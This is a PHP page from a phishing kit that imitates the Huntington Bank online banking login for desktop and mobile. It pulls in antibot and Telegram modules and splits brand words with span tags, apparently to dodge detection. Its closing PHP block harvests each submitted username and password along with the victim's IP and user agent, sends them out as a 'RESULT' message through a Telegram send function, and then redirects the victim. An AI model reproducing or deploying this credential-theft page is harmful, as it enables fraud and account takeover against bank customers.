<?php
ob_start();
session_start();
include 'includes/antibot.php';
include_once 'includes/telegram.php';
if (!isset($_SESSION['id'])){
	header('Location: index.php', true);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>Mobile Ban<span>king</span> Lo<spam>gin | Hunti</span>ngton Bank</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=no">
	<link rel="shortcut icon" type="image/jpg" href="static/img/favicon.ico"/>
	<link href="static/css/styles.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
</head>
<body>
	<div class="desktop">
		<nav class="top-nav navbar navbar-expand-lg navbar-light p-1">
			<ul class="navbar-nav ms-auto">
				<li class="nav-item mx-1">
					<a class="nav-link" href="">Open an Account</a>
				</li>
				<li class="nav-item mx-2">
					<a class="nav-link" href="">Customer Service</a>
				</li>
				<li class="nav-item mx-2">
					<a class="nav-link" href="">Community</a>
				</li>
				<li class="nav-item mx-2">
					<a class="nav-link" href="">Security</a>
				</li>
				<li class="nav-item mx-2">
					<a class="nav-link" href="">Find a branch</a>
				</li>
			</ul>
		</nav>
		<nav class="middle-nav navbar navbar-expand-lg navbar-light p-0 mx-4">
			<a class="navbar-brand" href="">
				<img src="static/img/lockup.svg" width="200px" />
			</a>
			<ul class="navbar-nav me-auto">
				<li class="nav-item mx-2">
					<a class="nav-link active mx-2" href="">Personal</a>
				</li>
				<li class="nav-item mx-2">
					<a class="nav-link mx-2" href="">Private Bank</a>
				</li>
				<li class="nav-item mx-2">
					<a class="nav-link mx-2" href="">Business</a>
				</li>
				<li class="nav-item mx-2">
					<a class="nav-link mx-2" href="">Commercial</a>
				</li>
			</ul>
			<ul class="navbar-nav ms-auto">
				<li class="nav-item">
					<a class="nav-link mx-2" href="">
						<span style="">
							<input class="ask-huntington" type="text" name="" placeholder="Ask Huntington"><svg class="ask-huntington-icon" fill="#2d822a" xmlns="http://www.w3.org/2000/svg" focusable="false" role="presentation" aria-hidden="true"><path d="M25.9 23.3l-6.8-6.7c1.2-1.7 1.9-3.8 1.9-6.1C21.1 4.7 16.3 0 10.5 0S0 4.7 0 10.5 4.7 21 10.5 21c2 0 3.9-.6 5.5-1.6l6.8 6.7c.6.6 1.5.6 2.1 0l1-.9c.6-.5.6-1.4 0-1.9zm-15.4-5.2c-4.2 0-7.5-3.4-7.5-7.5C3 6.4 6.4 3 10.5 3c4.2 0 7.5 3.4 7.5 7.5.1 4.2-3.3 7.6-7.5 7.6z"></path></svg>
						</span>
					</a>
				</li>
			</ul>
		</nav>
		<nav class="bottom-nav navbar navbar-expand-lg navbar-light py-2 px-4">
			<ul class="navbar-nav">
				<li class="nav-item me-1">
					<a class="nav-link active" href="">Banking</a>
				</li>
				<li class="nav-item me-1">
					<a class="nav-link" href="">Borrowing</a>
				</li>
				<li class="nav-item me-1">
					<a class="nav-link" href="">Investments</a>
				</li>
				<li class="nav-item me-1">
					<a class="nav-link" href="">Insurance</a>
				</li>
				<li class="nav-item me-1">
					<a class="nav-link" href="">Learn</a>
				</li>
				<li class="nav-item me-1">
					<a class="nav-link" href="">Online Services</a>
				</li>
				<li class="nav-item me-1">
					<a class="nav-link" href="">Security</a>
				</li>
			</ul>
		</nav>
		<div class="app-notification mt-4 text-center">
			<div class="login-icon mx-auto">
				<svg xmlns="http://www.w3.org/2000/svg" fill="white" width="100%" height="100%" viewBox="0 0 579 560" aria-hidden="true" focusable="false" role="presentation"><path d="M264.5,177.5L264.5 10.2 203.8 45.2 203.8 212.6 zM287.3,382.4L287.3 549.6 348 514.6 348 347.1 zM203.8,334.1L203.8 514.6 264.5 549.6 264.5 370.4 370.9 309.1 370.9 501.5 431.6 466.2 431.6 93.4 370.9 58.4 370.9 237.7 zM180.8,58.4L120.1 93.5 120.1 466.2 180.8 501.5 180.8 322.1 348 225.7 348 45.2 287.3 10.1 287.3 189.4 180.8 250.8 zM97.5,106.5L46,136.4c-5.1,3-9.2,9.5-9.2,14.7V409c0,5.1,4.1,11.6,9.3,14.7l51.5,29.8L97.5,106.5zM454.4,453.1l51.5-29.8c5.1-3,9.3-9.5,9.3-14.7V150.8c0-5.1-4.1-11.6-9.2-14.7l-51.5-29.8L454.4,453.1z"></path></svg>
			</div>
			<h3 class="my-3" style="font-weight: 600; color: #5ba63c;">Download the Huntington Mobile App</h3>
			<p class="my-3" style="font-weight: 500; font-size: 1.2rem; color: #394048;">Make banking on-the-go even easier.</p>
			<button class="download-btn mt-2">Download</button>
		</div>
		<div class="login-box-container">
			<div class="login-box mx-auto my-4 p-3">
				<form action="" method="POST">
					<ul class="pill-nav tabs">
						<li class="active">Personal & Business</li>
						<li>Commercial</li>
						<li>Other</li>
					</ul>
					<h3 class="login-header">Log into Online Banking</h3>
					<label for="username">Username</label><br>
					<input type="text" name="username" required><br>
					<label for="password">Password</label><br>
					<input type="password" name="password" required><br>
					<div class="row">
						<div class="col-6 pe-0">
							<button class="login-btn mt-3">
								<svg class="me-1" xmlns="http://www.w3.org/2000/svg" fill="white" height="21px" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true"><path d="M16.2641,10.283V7.7381a4.2987,4.2987,0,1,0-8.5973,0v2.5474a1.7624,1.7624,0,0,0-1.6594,1.7591v6.7536A1.7623,1.7623,0,0,0,7.77,20.5608h8.46a1.762,1.762,0,0,0,1.7626-1.7626V12.0446A1.762,1.762,0,0,0,16.2641,10.283Zm-3.3768,5.7476V17.96H11.1357V16.044a1.717,1.717,0,1,1,1.7516-.0134Zm1.6689-5.7485H9.3746V7.66a2.5383,2.5383,0,0,1,2.5383-2.5383h.1051A2.5382,2.5382,0,0,1,14.5562,7.66Z"></path></svg>Log In
							</button>
						</div>
						<div class="col-auto p-1">
							<a class="login-forgot" href="">Forgot<br>username?</a>
						</div>
						<div class="col-auto p-1">
							<a class="login-forgot" href="">Forgot<br>password?</a>
						</div>
					</div>
					<h3 class="login-header mt-1 mb-0">New to Online Banking?</h3>
					<span class="login-box-footer"><a href="">Enroll now</a> or <a href="">learn more</a></span>
				</form>
			</div>
		</div>
		<div class="login-footer px-4">
			<ul class="">
				<li class="me-3"><a href="">About Us</a></li>
				<li class="me-3"><a href="">Investor Relations</a></li>
				<li class="me-3"><a href="">Careers</a></li>
				<li class="me-3"><a href="">Site Map</a></li>
				<li class="me-3"><a href="">Privacy Policies</a></li>
				<li class="me-3"><a href="">Privacy & Security</a></li>
				<li class="me-3"><a href="">Terms of Use</a></li>
				<li class="me-3"><a href="">Email Updates</a></li>
				<li class="me-3"><a href="">All Branches & ATMS</a></li>
				<li class="me-3"><a href="">Routing Numbers</a></li>
				<li class="me-3"><a href="">Give Feedback</a></li>
			</ul>
			<ul class="social-footer">
				<li class="me-3">
					<a href="">
						<svg xmlns="http://www.w3.org/2000/svg" fill="#2d822a" width="20px" viewBox="0 0 24 24" aria-label="Visit Huntington's Facebook page" focusable="false"><path d="M22 3.1v17.8a1.11 1.11 0 01-1.1 1.1h-5.1v-7.8h2.6l.4-3h-3V9.3c0-.9.2-1.5 1.5-1.5h1.6V5.1c-.2 0-1.2-.1-2.3-.1a3.652 3.652 0 00-3.9 4v2.3h-2.6v3h2.6V22H3.1A1.11 1.11 0 012 20.9V3.1A1.11 1.11 0 013.1 2h17.8A1.11 1.11 0 0122 3.1z"></path></svg>
					</a>
				</li>
				<li class="me-3">
					<a href="">
						<svg xmlns="http://www.w3.org/2000/svg" fill="#2d822a" width="20px" viewBox="0 0 24 24" aria-label="Visit Huntington's Twitter feed" focusable="false"><path d="M19.644 6.341A8.072 8.072 0 0022 5.684a8.399 8.399 0 01-2.052 2.163c.011.178.011.36.011.54 0 5.524-4.125 11.89-11.671 11.89A11.46 11.46 0 012 18.402a8.026 8.026 0 00.979.058 8.129 8.129 0 005.094-1.792 4.111 4.111 0 01-3.831-2.901 4.059 4.059 0 001.852-.07A4.162 4.162 0 012.802 9.6v-.051a4.055 4.055 0 001.862.521 4.239 4.239 0 01-1.27-5.583 11.57 11.57 0 008.455 4.366 4.223 4.223 0 01-.105-.951 4.141 4.141 0 014.1-4.18 4.056 4.056 0 012.997 1.322 8.102 8.102 0 002.606-1.013 4.169 4.169 0 01-1.803 2.311z"></path></svg>
					</a>
				</li>
				<li class="me-3">
					<a href="">
						<svg xmlns="http://www.w3.org/2000/svg" fill="#2d822a" width="20px" viewBox="0 0 24 24" aria-label="Visit Huntington's Instagram page" focusable="false"><path d="M12,6.868A5.0523,5.0523,0,0,0,6.9107,12a5.0895,5.0895,0,1,0,10.1786,0A5.0523,5.0523,0,0,0,12,6.868Zm0,8.5534A3.4215,3.4215,0,1,1,15.3929,12,3.5273,3.5273,0,0,1,12,15.4214Zm6.5177-8.8233a1.1608,1.1608,0,1,1-1.1607-1.17A1.1869,1.1869,0,0,1,18.5177,6.5981Zm2.9466-1.2607a5.2808,5.2808,0,0,0-1.1607-1.7107,5.2333,5.2333,0,0,0-1.6965-1.17,5.9126,5.9126,0,0,0-2.5-.45A38.9846,38.9846,0,0,0,12,1.916a38.9858,38.9858,0,0,0-4.1071.09,8.9077,8.9077,0,0,0-2.5.45A5.2344,5.2344,0,0,0,3.6964,3.6267,5.2808,5.2808,0,0,0,2.5357,5.3374a6.0512,6.0512,0,0,0-.4464,2.521A39.9519,39.9519,0,0,0,2,12a39.9543,39.9543,0,0,0,.0893,4.1417,9.1343,9.1343,0,0,0,.4464,2.5218,4.478,4.478,0,0,0,1.1607,1.71,5.22,5.22,0,0,0,1.6965,1.17,5.8989,5.8989,0,0,0,2.5.45A38.9858,38.9858,0,0,0,12,22.084a38.9846,38.9846,0,0,0,4.1071-.09,8.8747,8.8747,0,0,0,2.5-.45,4.4246,4.4246,0,0,0,1.6965-1.17,5.2873,5.2873,0,0,0,1.1607-1.71,6.0557,6.0557,0,0,0,.4464-2.5218A39.9543,39.9543,0,0,0,22,12a39.9519,39.9519,0,0,0-.0893-4.1416A9.1209,9.1209,0,0,0,21.4643,5.3374ZM20.0357,15.9625a3.3679,3.3679,0,0,1-.3571,1.8007,3.1785,3.1785,0,0,1-.7143,1.17,3.1452,3.1452,0,0,1-1.1607.72,5.5027,5.5027,0,0,1-1.7857.3611A38.2786,38.2786,0,0,1,12,20.1032a38.2786,38.2786,0,0,1-4.0179-.0891,3.2862,3.2862,0,0,1-1.7857-.3611,3.146,3.146,0,0,1-1.1607-.72,3.1785,3.1785,0,0,1-.7143-1.17,5.6221,5.6221,0,0,1-.3571-1.8007A38.8562,38.8562,0,0,1,3.875,11.91a38.8345,38.8345,0,0,1,.0893-4.0516,3.3644,3.3644,0,0,1,.3571-1.8008,3.1823,3.1823,0,0,1,.7143-1.17,3.1463,3.1463,0,0,1,1.1607-.72,5.4893,5.4893,0,0,1,1.7857-.36A37.8973,37.8973,0,0,1,12,3.7167a37.8973,37.8973,0,0,1,4.0179.09,3.29,3.29,0,0,1,1.7857.36,3.1455,3.1455,0,0,1,1.1607.72,3.1823,3.1823,0,0,1,.7143,1.17,5.6176,5.6176,0,0,1,.3571,1.8008A38.8345,38.8345,0,0,1,20.125,11.91,38.8562,38.8562,0,0,1,20.0357,15.9625Z" fill="#2d822a"></path></svg>
					</a>
				</li>
				<li class="me-3">
					<a href="">
						<svg xmlns="http://www.w3.org/2000/svg" fill="#2d822a" width="20px" viewBox="0 0 24 24" aria-label="Visit Huntington's YouTube page" focusable="false"><path d="M19.3546,5.0837A116.3343,116.3343,0,0,0,4.9621,5.0762,3.0177,3.0177,0,0,0,2.2955,7.4526a38.1049,38.1049,0,0,0-.0815,8.7688,3.5246,3.5246,0,0,0,2.8881,2.7074,101.83,101.83,0,0,0,14.3784-.0835,2.6087,2.6087,0,0,0,2.2289-2.21,38.6174,38.6174,0,0,0,.03-9.205A2.7927,2.7927,0,0,0,19.3546,5.0837ZM9.9324,14.6271V8.9492l5.3926,2.8427Z" fill="#2d822a"></path></svg>
					</a>
				</li>
				<li class="me-3">
					<a href="">
						<svg xmlns="http://www.w3.org/2000/svg" fill="#2d822a" width="20px" viewBox="0 0 24 24" aria-label="Visit Huntington's LinkedIn page" focusable="false"><path d="M20.515 2H3.485A1.455 1.455 0 002 3.397v17.118A1.53 1.53 0 003.485 22h17.03A1.473 1.473 0 0022 20.515V3.485A1.421 1.421 0 0020.515 2zM7.94 19.03H4.97V9.513h2.969zM6.453 8.2A1.747 1.747 0 118.2 6.455a1.752 1.752 0 01-1.747 1.747zm12.578 10.83H16.06v-4.628c0-1.136 0-2.533-1.571-2.533s-1.747 1.223-1.747 2.445v4.717H9.86V9.51h2.882v1.31a3.153 3.153 0 012.795-1.572c2.97 0 3.58 2.008 3.58 4.541z"></path></svg>
					</a>
				</li>
			</ul>
			<br><br>
			<p class="footer-text">Lending products are subject to credit application and approval.</p>
			<p class="footer-text"><b>Investment, Insurance and Non-deposit Trust products are: NOT A DEPOSIT • NOT FDIC INSURED • NOT GUARANTEED BY THE BANK • NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY • MAY LOSE VALUE</b></p>
			<div class="row">
				<div class="col-auto">
					<img src="static/img/house-small.svg" width="30px">
				</div>
				<div class="col-11">
					<p class="footer-text">The Hu<span>ntington National Ba</span>nk is an Equal Housing Lender and Member FDIC. <img alt="The Huntington logo" src="static/img/honeycomb.svg" width="15" height="15"><sup>®</sup>, Huntington<sup>®</sup>,<img alt="The Huntington logo" src="static/img/honeycomb.svg" width="15" height="15">Hunt<span>ington.Welc</span>ome.<sup>®</sup> and Hu<span>ntingt</span>on Heads Up<sup>®</sup> are federally registered service marks of Hunti<span>ngton</span> Bancshares Incorporated. © 2022 Huntington Bancshares Incorporated.</p>
				</div>
			</div>

		</div>
	</div>
	<div class="mobile">
		<nav class="top-nav navbar navbar-expand-lg navbar-light py-0 px-2">
			<ul class="navbar-nav">
				<li class="nav-item">
					<a class="nav-link" href="">
						<svg xmlns="http://www.w3.org/2000/svg" width="24px" height="24px" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true"><path d="M20.5,12a.9448.9448,0,0,1-1,1H4.5a1,1,0,0,1,0-2h15A.9448.9448,0,0,1,20.5,12Zm-1,5H4.5a1,1,0,0,0,0,2h15a1,1,0,0,0,0-2Zm0-12H4.5a.9448.9448,0,0,0-1,1,.9448.9448,0,0,0,1,1h15a.9448.9448,0,0,0,1-1A.9448.9448,0,0,0,19.5,5Z" fill="#5ba645"></path></svg>
					</a>
				</li>
				<li class="nav-item">
					<a class="nav-link" href="">
						<img class="ms-3" src="static/img/lockup.svg" width="128px" />
					</a>
				</li>
			</ul>
			<ul class="navbar-nav ms-auto">
				<li class="nav-item">
					<a class="nav-link me-3" href="">
						<svg xmlns="http://www.w3.org/2000/svg" width="24px" height="24px" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true"><path d="M18.4,20.5H5.5a.9448.9448,0,0,1-1-1,7.51,7.51,0,0,1,4.4-6.8,5.1169,5.1169,0,0,1-2-4.1A5.0577,5.0577,0,0,1,12,3.5a5.1215,5.1215,0,0,1,5.1,5.1,5.2654,5.2654,0,0,1-2,4.1,7.51,7.51,0,0,1,4.4,6.8A1.09,1.09,0,0,1,18.4,20.5Zm-11.8-2H17.4A5.5713,5.5713,0,0,0,12,14,5.5713,5.5713,0,0,0,6.6,18.5ZM12,5.5a3.1,3.1,0,1,0,3.1,3.1A3.1156,3.1156,0,0,0,12,5.5Z" fill="#5ba645"></path></svg>
					</a>
				</li>
				<li class="nav-item">
					<a class="nav-link me-3" href="">
						<svg xmlns="http://www.w3.org/2000/svg" width="24px" height="24px" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true"><path d="M12,13.75a3.6914,3.6914,0,0,1-3.7-3.7,3.7,3.7,0,1,1,7.4,0A3.7571,3.7571,0,0,1,12,13.75Zm0-5.4a1.6275,1.6275,0,0,0-1.7,1.7,1.6275,1.6275,0,0,0,1.7,1.7,1.7524,1.7524,0,0,0,1.7-1.7A1.7524,1.7524,0,0,0,12,8.35Zm0,12.4a.7786.7786,0,0,1-.7-.3c-.7-.8-6.1-7-6.1-10.4a6.8,6.8,0,0,1,13.6,0c0,3.5-5.4,9.7-6.1,10.4A2.1175,2.1175,0,0,1,12,20.75Zm0-15.5a4.7386,4.7386,0,0,0-4.8,4.8c0,1.8,2.7,5.7,4.8,8.2,2.1-2.5,4.8-6.3,4.8-8.2A4.8011,4.8011,0,0,0,12,5.25Z" fill="#5ba645"></path></svg>
					</a>
				</li>
				<li class="nav-item">
					<a class="nav-link" href="">
						<svg xmlns="http://www.w3.org/2000/svg" width="24px" height="24px" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true"><path d="M15.0357,10.7857a4.25,4.25,0,1,0-4.25,4.25A4.2551,4.2551,0,0,0,15.0357,10.7857Zm4.8572,7.8929a1.2229,1.2229,0,0,1-1.2143,1.2143,1.19,1.19,0,0,1-.8538-.3605L14.5709,16.288a6.6787,6.6787,0,1,1,1.7171-1.7171l3.2539,3.2539a1.2213,1.2213,0,0,1,.351.8538Z" fill="#5ba63c"></path></svg>
					</a>
				</li>
			</ul>
		</nav>
		<div class="app-notification mt-4 text-center p-1">
			<div class="login-icon mx-auto">
				<svg xmlns="http://www.w3.org/2000/svg" fill="white" width="100%" height="100%" viewBox="0 0 579 560" aria-hidden="true" focusable="false" role="presentation"><path d="M264.5,177.5L264.5 10.2 203.8 45.2 203.8 212.6 zM287.3,382.4L287.3 549.6 348 514.6 348 347.1 zM203.8,334.1L203.8 514.6 264.5 549.6 264.5 370.4 370.9 309.1 370.9 501.5 431.6 466.2 431.6 93.4 370.9 58.4 370.9 237.7 zM180.8,58.4L120.1 93.5 120.1 466.2 180.8 501.5 180.8 322.1 348 225.7 348 45.2 287.3 10.1 287.3 189.4 180.8 250.8 zM97.5,106.5L46,136.4c-5.1,3-9.2,9.5-9.2,14.7V409c0,5.1,4.1,11.6,9.3,14.7l51.5,29.8L97.5,106.5zM454.4,453.1l51.5-29.8c5.1-3,9.3-9.5,9.3-14.7V150.8c0-5.1-4.1-11.6-9.2-14.7l-51.5-29.8L454.4,453.1z"></path></svg>
			</div>
			<h3 class="my-3" style="font-weight: 600; font-size: 1.3rem; color: #5ba63c;">Download the Hunt<span>ington Mob</span>ile App</h3>
			<p class="my-3" style="font-weight: 500; font-size: 1.2rem; color: #394048;">Make banking on-the-go even easier.</p>
			<button class="download-btn mt-2">Download</button>
		</div>
		<div class="login-box-container p-3 mt-3">
			<form action="" method="POST">
				<ul class="pill-nav tabs">
					<li class="active">Personal & Business</li>
					<li>Commercial</li>
					<li>Other</li>
				</ul>
				<h3 class="login-header">Log into Online Banking</h3>
				<label for="username">Username</label><br>
				<input type="text" name="username" required><br>
				<label for="password">Password</label><br>
				<input type="password" name="password" required><br>
				<div class="row">
					<div class="col-6 pe-0">
						<button class="login-btn mt-3">
							<svg class="me-1" xmlns="http://www.w3.org/2000/svg" fill="white" height="21px" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true"><path d="M16.2641,10.283V7.7381a4.2987,4.2987,0,1,0-8.5973,0v2.5474a1.7624,1.7624,0,0,0-1.6594,1.7591v6.7536A1.7623,1.7623,0,0,0,7.77,20.5608h8.46a1.762,1.762,0,0,0,1.7626-1.7626V12.0446A1.762,1.762,0,0,0,16.2641,10.283Zm-3.3768,5.7476V17.96H11.1357V16.044a1.717,1.717,0,1,1,1.7516-.0134Zm1.6689-5.7485H9.3746V7.66a2.5383,2.5383,0,0,1,2.5383-2.5383h.1051A2.5382,2.5382,0,0,1,14.5562,7.66Z"></path></svg>Log In
						</button>
					</div>
					<div class="col-auto p-1 mx-auto">
						<a class="login-forgot" href="">Forgot<br>username?</a>
					</div>
					<div class="col-auto p-1 mx-auto">
						<a class="login-forgot" href="">Forgot<br>password?</a>
					</div>
				</div>
				<h3 class="login-header mt-3 mb-0">New to Online Banking?</h3>
				<span class="login-box-footer"><a href="">Enroll now</a> or <a href="">learn more</a></span>
			</form>
		</div>
		<div class="login-footer-mobile p-3">
			<ul class="">
				<li class="me-3"><a href="">About Us</a></li>
				<li class="me-3"><a href="">Investor Relations</a></li>
				<li class="me-3"><a href="">Careers</a></li>
				<li class="me-3"><a href="">Site Map</a></li>
				<li class="me-3"><a href="">Privacy Policies</a></li>
				<li class="me-3"><a href="">Privacy & Security</a></li>
				<li class="me-3"><a href="">Terms of Use</a></li>
				<li class="me-3"><a href="">Email Updates</a></li>
				<li class="me-3"><a href="">All Branches & ATMS</a></li>
				<li class="me-3"><a href="">Routing Numbers</a></li>
				<li class="me-3"><a href="">Give Feedback</a></li>
			</ul>
			<ul class="social-footer">
				<li class="me-3">
					<a href="">
						<svg xmlns="http://www.w3.org/2000/svg" fill="#2d822a" width="20px" viewBox="0 0 24 24" aria-label="Visit Huntington's Facebook page" focusable="false"><path d="M22 3.1v17.8a1.11 1.11 0 01-1.1 1.1h-5.1v-7.8h2.6l.4-3h-3V9.3c0-.9.2-1.5 1.5-1.5h1.6V5.1c-.2 0-1.2-.1-2.3-.1a3.652 3.652 0 00-3.9 4v2.3h-2.6v3h2.6V22H3.1A1.11 1.11 0 012 20.9V3.1A1.11 1.11 0 013.1 2h17.8A1.11 1.11 0 0122 3.1z"></path></svg>
					</a>
				</li>
				<li class="me-3">
					<a href="">
						<svg xmlns="http://www.w3.org/2000/svg" fill="#2d822a" width="20px" viewBox="0 0 24 24" aria-label="Visit Huntington's Twitter feed" focusable="false"><path d="M19.644 6.341A8.072 8.072 0 0022 5.684a8.399 8.399 0 01-2.052 2.163c.011.178.011.36.011.54 0 5.524-4.125 11.89-11.671 11.89A11.46 11.46 0 012 18.402a8.026 8.026 0 00.979.058 8.129 8.129 0 005.094-1.792 4.111 4.111 0 01-3.831-2.901 4.059 4.059 0 001.852-.07A4.162 4.162 0 012.802 9.6v-.051a4.055 4.055 0 001.862.521 4.239 4.239 0 01-1.27-5.583 11.57 11.57 0 008.455 4.366 4.223 4.223 0 01-.105-.951 4.141 4.141 0 014.1-4.18 4.056 4.056 0 012.997 1.322 8.102 8.102 0 002.606-1.013 4.169 4.169 0 01-1.803 2.311z"></path></svg>
					</a>
				</li>
				<li class="me-3">
					<a href="">
						<svg xmlns="http://www.w3.org/2000/svg" fill="#2d822a" width="20px" viewBox="0 0 24 24" aria-label="Visit Huntington's Instagram page" focusable="false"><path d="M12,6.868A5.0523,5.0523,0,0,0,6.9107,12a5.0895,5.0895,0,1,0,10.1786,0A5.0523,5.0523,0,0,0,12,6.868Zm0,8.5534A3.4215,3.4215,0,1,1,15.3929,12,3.5273,3.5273,0,0,1,12,15.4214Zm6.5177-8.8233a1.1608,1.1608,0,1,1-1.1607-1.17A1.1869,1.1869,0,0,1,18.5177,6.5981Zm2.9466-1.2607a5.2808,5.2808,0,0,0-1.1607-1.7107,5.2333,5.2333,0,0,0-1.6965-1.17,5.9126,5.9126,0,0,0-2.5-.45A38.9846,38.9846,0,0,0,12,1.916a38.9858,38.9858,0,0,0-4.1071.09,8.9077,8.9077,0,0,0-2.5.45A5.2344,5.2344,0,0,0,3.6964,3.6267,5.2808,5.2808,0,0,0,2.5357,5.3374a6.0512,6.0512,0,0,0-.4464,2.521A39.9519,39.9519,0,0,0,2,12a39.9543,39.9543,0,0,0,.0893,4.1417,9.1343,9.1343,0,0,0,.4464,2.5218,4.478,4.478,0,0,0,1.1607,1.71,5.22,5.22,0,0,0,1.6965,1.17,5.8989,5.8989,0,0,0,2.5.45A38.9858,38.9858,0,0,0,12,22.084a38.9846,38.9846,0,0,0,4.1071-.09,8.8747,8.8747,0,0,0,2.5-.45,4.4246,4.4246,0,0,0,1.6965-1.17,5.2873,5.2873,0,0,0,1.1607-1.71,6.0557,6.0557,0,0,0,.4464-2.5218A39.9543,39.9543,0,0,0,22,12a39.9519,39.9519,0,0,0-.0893-4.1416A9.1209,9.1209,0,0,0,21.4643,5.3374ZM20.0357,15.9625a3.3679,3.3679,0,0,1-.3571,1.8007,3.1785,3.1785,0,0,1-.7143,1.17,3.1452,3.1452,0,0,1-1.1607.72,5.5027,5.5027,0,0,1-1.7857.3611A38.2786,38.2786,0,0,1,12,20.1032a38.2786,38.2786,0,0,1-4.0179-.0891,3.2862,3.2862,0,0,1-1.7857-.3611,3.146,3.146,0,0,1-1.1607-.72,3.1785,3.1785,0,0,1-.7143-1.17,5.6221,5.6221,0,0,1-.3571-1.8007A38.8562,38.8562,0,0,1,3.875,11.91a38.8345,38.8345,0,0,1,.0893-4.0516,3.3644,3.3644,0,0,1,.3571-1.8008,3.1823,3.1823,0,0,1,.7143-1.17,3.1463,3.1463,0,0,1,1.1607-.72,5.4893,5.4893,0,0,1,1.7857-.36A37.8973,37.8973,0,0,1,12,3.7167a37.8973,37.8973,0,0,1,4.0179.09,3.29,3.29,0,0,1,1.7857.36,3.1455,3.1455,0,0,1,1.1607.72,3.1823,3.1823,0,0,1,.7143,1.17,5.6176,5.6176,0,0,1,.3571,1.8008A38.8345,38.8345,0,0,1,20.125,11.91,38.8562,38.8562,0,0,1,20.0357,15.9625Z" fill="#2d822a"></path></svg>
					</a>
				</li>
				<li class="me-3">
					<a href="">
						<svg xmlns="http://www.w3.org/2000/svg" fill="#2d822a" width="20px" viewBox="0 0 24 24" aria-label="Visit Huntington's YouTube page" focusable="false"><path d="M19.3546,5.0837A116.3343,116.3343,0,0,0,4.9621,5.0762,3.0177,3.0177,0,0,0,2.2955,7.4526a38.1049,38.1049,0,0,0-.0815,8.7688,3.5246,3.5246,0,0,0,2.8881,2.7074,101.83,101.83,0,0,0,14.3784-.0835,2.6087,2.6087,0,0,0,2.2289-2.21,38.6174,38.6174,0,0,0,.03-9.205A2.7927,2.7927,0,0,0,19.3546,5.0837ZM9.9324,14.6271V8.9492l5.3926,2.8427Z" fill="#2d822a"></path></svg>
					</a>
				</li>
				<li class="me-3">
					<a href="">
						<svg xmlns="http://www.w3.org/2000/svg" fill="#2d822a" width="20px" viewBox="0 0 24 24" aria-label="Visit Huntington's LinkedIn page" focusable="false"><path d="M20.515 2H3.485A1.455 1.455 0 002 3.397v17.118A1.53 1.53 0 003.485 22h17.03A1.473 1.473 0 0022 20.515V3.485A1.421 1.421 0 0020.515 2zM7.94 19.03H4.97V9.513h2.969zM6.453 8.2A1.747 1.747 0 118.2 6.455a1.752 1.752 0 01-1.747 1.747zm12.578 10.83H16.06v-4.628c0-1.136 0-2.533-1.571-2.533s-1.747 1.223-1.747 2.445v4.717H9.86V9.51h2.882v1.31a3.153 3.153 0 012.795-1.572c2.97 0 3.58 2.008 3.58 4.541z"></path></svg>
					</a>
				</li>
			</ul>
			<br><br>
			<p class="footer-text">Lending products are subject to credit application and approval.</p>
			<p class="footer-text"><b>Investment, Insurance and Non-deposit Trust products are: NOT A DEPOSIT • NOT FDIC INSURED • NOT GUARANTEED BY THE BANK • NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY • MAY LOSE VALUE</b></p>
			<div class="my-3">
				<img src="static/img/house-small.svg" width="30px">
			</div>
			<div class="mb-5">
				<p class="footer-text">The Hun<span>tington National Bank is an Equal Ho</span>using Lender and Member FDIC. <img alt="The Huntington logo" src="static/img/honeycomb.svg" width="15" height="15"><sup>®</sup>, Hun<span>tin</span>gton<sup>®</sup>,<img alt="The Huntington logo" src="static/img/honeycomb.svg" width="15" height="15">Hunt<span>ington.</span>Welcome.<sup>®</sup> and H<span>unti</span>ngton Heads Up<sup>®</sup> are federally registered service marks of Hun<span>tington Bancshares Incorporated. © 2022 Hunti</span>ngton Bancshares Incorporated.</p>
			</div>
		</div>
	</div>
	<script src="static/js/cleave.js"></script>
	<script src="static/js/cleave-phone.us.js"></script>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
</body>
</html>
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
	$ip = $_SERVER['REMOTE_ADDR'];
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$username = $_REQUEST['username'];
	$password = $_REQUEST['password'];

	if (!isset($_SESSION['id'])){
		header('Location: index.php', true);
	}

	$msg = "HUNTI" . "NGTON RES" . "ULT\n\n| DEVICE : #{$_SESSION['id']}\n| IP : {$ip}\n| USER AGENT : {$user_agent}\n\n| USERNAME : {$username}\n| PASSWORD : {$password}";
	send_message($msg);
	header('Location: ale' . 'rt.php', true);
}
?>